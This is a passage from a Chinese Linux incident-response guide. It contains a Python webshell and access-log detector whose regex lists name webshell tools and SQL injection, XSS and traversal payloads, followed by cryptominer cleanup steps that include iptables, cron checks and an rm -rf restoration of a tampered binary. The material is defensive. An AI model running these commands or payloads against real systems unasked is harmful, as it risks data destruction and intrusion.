'<SCRIPT\s*RUNAT=SERVER\s*LANGUAGE=JAVASCRIPT>(.*)eval',
'reDuh(.*)',
'PublicKeyToken\=B03F5F7F11D50A3A',
'20132165414621325641311254123112512',
'#@~\^oHMBAA==@#@&@#@&"\+kwW',
'(Client/Login\.xml\?Command=Login&Sync=1227081437828)|(因为serv-u的userid变化我搞不懂)',
'aspmuma|(免杀去后门版\s*by\s*UnKnown)',
'芝麻开门|F4ck|1c1f81a8b0a630f530f52fa9aa9dda1b|法客论坛|F4ckTeam',
'silicname|silicpass|命令行执行',
'server.mappath\("go.asp"\)',
'MSSQL语句执行工具',
'gif89a(\s|\n)*<%@?',
'UJ@!z\(G9X@\*@!z4Y:\^@\*ryglpAA==\^#~@',
'clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8',
'WebSniff(.*?)Powered\s*by',
'11\.asp',
'mssql导库|闪电小子|\_tysan|MYSQL Manager',
'#@~\^bGsBAA==@#@&AC13`DV{J@!8D@\*@!8D@\*@!\^n']
jsp_Features_list = [
'reDuh',
'没有权限执行该操作',
'(chopper|QQ\(cs,z1,z2,sb\)|caicaihk|Alanwalker|(by\s*n1nty)|(Code\s*By\s*Ninty)|JspSpyPwd|JspSpy|6625108|(charles\s*QQ\s*77707777))',
'((21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500)|(192.168.230.1\s*4444))',
'1decc1ce886d1b2f9f91ecb39967832d05f8e8b8',
'JFolder\.jsp|Steven\s*Cee|JFileMan\.jsp|hack520\s*by|mailto\:hack520@77169\.org|by\s*Bagheera|luoluonet|Recoding\s*by\s*Juliet|lovehacker|webshell\.jsp|Hacker|jsp\s*File\s*Browser|jshell|ceshi2009']
other_Features_list = ['System32\\cmd\.exe|cmd|CFM\s*shell',
'俺的门门',
'Gamma Web Shell']
attack__Features_list = {"\.\./":"目录穿越攻击",
"select.+(from|limit)":"SQL注入攻击",
"(?:(union(.*?)select))":"SQL注入攻击",
"having|rongjitest":"SQL注入攻击",
"sleep\((\s*)(\d*)(\s*)\)":"SQL注入攻击",
"benchmark\((.*)\,(.*)\)":"SQL注入攻击",
"base64_decode\(":"SQL注入攻击",
"(?:from\W+information_schema\W)":"SQL注入攻击",
"(?:(?:current_)user|database|schema|connection_id)\s*\(":"SQL注入攻击",
"(?:etc\/\W*passwd)":"敏感文件操作",
"into(\s+)+(?:dump|out)file\s*":"SQL注入攻击",
"group\s+by.+\(":"SQL注入攻击",
"xwork.MethodAccessor":"命令注入攻击",
"xwork\.MethodAccessor":"命令注入攻击",
"(gopher|doc|php|glob|file|phar|zlib|ftp|ldap|dict|ogg|data)\:\/":"敏感文件操作",
"\<(iframe|script|body|img|layer|div|meta|style|base|object|input)":"XSS跨站脚本",
"(alert|confirm|prompt)":"XSS跨站脚本",
"(onmouseover|onerror|onload)\=":"XSS跨站脚本",
"java\.lang":"命令注入攻击",
"\.(svn|htaccess|bash_history)":"敏感文件访问",
"\.(bak|inc|old|mdb|sql|backup|java|class)$":"敏感文件访问",
"(vhost|bbs|host|wwwroot|www|site|root|hytop|flashfxp).*\.rar":"敏感文件访问",
"(phpmyadmin|jmx-console|jmxinvokerservlet)":"管理控制台探测行为",
"/(attachments|upimg|images|css|uploadfiles|html|uploads|templets|static|template|data|inc|forumdata|upload|includes|cache|avatar)/(\\w+).(php|jsp)":"敏感文件访问",
"(HTTrack|harvest|audit|dirbuster|pangolin|nmap|sqln|-scan|hydra|Parser|libwww|BBBike|sqlmap|w3af|owasp|Nikto|fimap|havij|PycURL|zmeu|BabyKrokodil|netsparker|httperf|bench| SF/)":"Web扫描器扫描"
}
def Un_worktime_login(localday):
if os.popen("last |grep -v 'reboot' |grep " + "'" + localday.strip() + "'" + "|awk '($7>=\"12:00\" && $7<=\"14:00\") || ($7>=\"00:00\" && $7<=\"06:00\")'").readlines():
print '[+] Un_worktime_login ------------------------------------ [ DONE ]'
for bb in os.popen("last |grep -v 'reboot' |grep " + "'" + localday.strip() + "'" + "|awk '($7>=\"12:00\" && $7<=\"14:00\") || ($7>=\"00:00\" && $7<=\"06:00\")'").readlines():
print bb.strip()
return True
else:
return False
def Faild_user(localday):
print '\n[+] Faild_user ------------------------------------ [ DONE ]'
os.system("egrep '(new user: name=)|(Failed password for)' /var/log/secure*|grep " + "'" + localday + "'")
def Un_trust_user():
all_user = os.popen("grep '/bin/bash' /etc/passwd | awk -F ':' '{print $1}'").readlines()
print '\n[+] Un_trust_user ------------------------------------ [ DONE ]'
for l in all_user:
if l.strip() not in TRUST_USER:
os.system("grep "+l.strip()+" /etc/passwd")
def Dubious_netstat():
print '\n[+] Dubious_netstat ------------------------------------ [ DONE ]'
for ip in TRUST_IP:
os.system("netstat -antp|egrep -v ':::*' |egrep 'ESTABLISHED|LISTEN'|awk '$5 !~ /"+ip.strip()+"/' | awk '$5 ~/:(21|22|443|80|8080|7001|8443|9080)$/{print}'")
def Dubious_files(filepath):
for f in os.listdir(filepath):
path = os.path.join(filepath, f)
if os.path.isfile(path):
FILE_LIST.append(path)
if os.path.isdir(path):
Dubious_files(path)
def Webshell_detect(filename,rulename):
f1 = open(filename).read()
for rule in rulename:
result = re.compile(rule).findall(f1)
if result:
print "============================================"
print 'Risk file:' + filename
print 'Risk code：' + str(result[0])
os.system("stat " +str(filename)+ " |grep 'Modify'")
def Attack_analysis():
f2 = open(ACCESS_LOG).readlines()
print "\n[+] Attack_analysis ------------------------------------ [ DONE ]"
for line in f2:
for r in attack__Features_list:
result = re.compile(r).findall(line)
if result:
print '匹配特征：' + '[' + str(result[0]) + ']' + '===>' + line.strip()
print '攻击类型:' + '[' + attack__Features_list[r] + ']'
if __name__=='__main__':
localday = os.popen("env LANG=en_US.UTF-8 date |awk '{print $2,$3}'").readline().strip()
Un_worktime_login(localday)
Faild_user(localday)
Un_trust_user()
Dubious_netstat()
for file in FILE_PATH:
Dubious_files(file.strip())
print '\n[+] Webshell_detect ------------------------------------ [ DONE ]'
for f in FILE_LIST:
if str(f).lower().endswith(".php"):
Webshell_detect(f, php_Features_list)
elif str(f).lower().endswith(".jsp"):
Webshell_detect(f, jsp_Features_list)
elif str(f).lower().endswith(".aspx"):
Webshell_detect(f, asp_Features_list)
Attack_analysis()
```
<a name="QU3dz"></a>
## 四. 挖矿木马
攻击流程<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944551-a661a44e-453d-4e5c-b931-8ce78cbc2de6.png#averageHue=%23eff6f7&height=542&id=M0O6x&originHeight=542&originWidth=893&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=893)<br />特征<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944653-9abd4f48-f474-42cd-8f20-30392e907eb9.png#averageHue=%23f8fbfb&height=320&id=CElNf&originHeight=320&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1080)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944756-0949a14e-2ba3-4ab6-80d6-168fce022d6e.png#averageHue=%233e3736&height=236&id=upGU9&originHeight=236&originWidth=830&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=830)
<a name="vev4g"></a>
### 4.1 阻断通信
```bash
iptables -L -n
vim /etc/sysconfig/iptables
iptables -A INPUT -s 可疑地址 -j DROP
iptables -A OUTPUT -d 可疑地址 -j DROP
```
<a name="kvWBB"></a>
### 4.2 计划任务检查
```bash
crontab -l
```
查看系统特定用户的计划任务：
```bash
crontab -u username -l
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944856-c2c03b86-f201-4724-8896-c8dd27cc833e.png#averageHue=%23323232&height=49&id=lvf8R&originHeight=49&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=729)<br />查看其他计划任务文件：
```bash
cat /etc/crontab
cat /var/spool/cron
cat /etc/anacrontab
cat /etc/cron.d/
cat /etc/cron.daily/
cat /etc/cron.hourly/
cat /etc/cron.weekly/
cat /etc/cron.monthly/
cat /var/spool/cron/
```
<a name="x2THH"></a>
### 4.3 启动项
CentOS7以下版本：
```bash
chkconfig –list
chkconfig 服务名 off
```
CentOS7及以上版本：
```bash
systemctl list-unit-files
systemctl disable 服务名
```
```bash
/usr/lib/systemd/system
/usr/lib/systemd/system/multi-user.target.wants
/etc/rc.local
/etc/inittab
/etc/rc0.d/
/etc/rc1.d/
/etc/rc2.d/
/etc/rc3.d/
/etc/rc4.d/
/etc/rc5.d/
/etc/rc6.d/
/etc/rc.d/
```
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040944952-90aad305-cf6b-4dd9-b877-58a0dafb2eb6.png#averageHue=%23fbfcf9&height=333&id=lFRuZ&originHeight=333&originWidth=418&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=418)
<a name="mOpGa"></a>
### 4.4 判断可疑进程
（1）执行`ls -al /proc/$PID/exe`确认可疑进程对应的文件；<br />（2）若文件未被删除，则直接上传文件到Virustotal进行检测，或者计算出文件对应的md5，使用md5去Virustotal进行查询；若文件已被删除，可执行`cat /proc/$PID/exe > /tmp/t.bin`将进程dump到特定目录，再上传文件到Virustotal或者计算dump文件对应的md5到Virustotal进行查询。如果有多款杀毒引擎同时检出，那基本可以判定该进程为恶意进程。<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040945037-fe1193b5-8723-4169-ad4d-e011e236246c.png#averageHue=%231d1d1a&height=383&id=Ebffh&originHeight=383&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1028)<br />![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040945152-6c338d3a-75e2-4cf7-8ee4-e8681cf6e1ed.png#averageHue=%23f3f9f9&height=651&id=qHAea&originHeight=651&originWidth=1080&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=1080)
<a name="tJtTt"></a>
### 4.5 top源文件被篡改
![](https://cdn.nlark.com/yuque/0/2022/png/27875807/1655040945269-f9dfca7d-9eaa-41a0-a27f-92eee9f854bc.png#averageHue=%23dfe6e6&height=454&id=VCslZ&originHeight=454&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=825)
```bash
rm -rf /usr/bin/top && mv /usr/bin/top.original /usr/bin/top
```


<a name="dg9uX"></a>
## 五. 处置办法
<a name="QLtx2"></a>
### 给出相应解决办法
如

- 拒绝所有到服务器的22端口访问。
- 拒绝所有服务器对外部访问。
- 删除以下文件。

/.warmup<br />/root/.warmup<br />/etc/cron.hourly/somescript<br />/etc/cron.hourly/.somescript<br />/etc/xtab/somescript<br />/etc/xtab/.somescript<br />/etc/init.d/warmup与modules<br />/etc/alternatives/.warmup下文件与ip.txt<br />......

- 关闭以下服务。

systemctl stop xinetd<br />systemctl disable xinetd

- 备份数据库中数据。
- 格式化后重新安装操作系统。
- 重新部署业务系统。（防止业务系统例如webapp被植入木马后门不能采用服务器上的文件备份）
- 导入数据库备份。
- 系统重新上线。
<a name="svnXq"></a>
### 上线前做好安全基线检查

- 禁止系统、应用业务、中间件弱口令
- 禁止服务账号如：mongo用户登录操作系统
- 关闭不必要的服务（端口）
- 开展上线前漏洞扫描
- 在系统自带iptables设置正确的控制策略，如难度较大至少边界防火墙设置策略。
- 对外部的访问：

在边界防火墙上设置正确的访问策略，严格进制服务器对外：互联网和政务网的主动连接，如果必须请至少具体化源和目标地址。

- 对外提供服务：

只开放业务端口到服务器集群（精确到目标地址和目标端口），如非必要对境外提供服务，请最好设置只允许国内IP地址范围访问业务（中国大陆IP范围和电子政务网IP范围à对外服务的目标服务器地址和业务目标端口）。
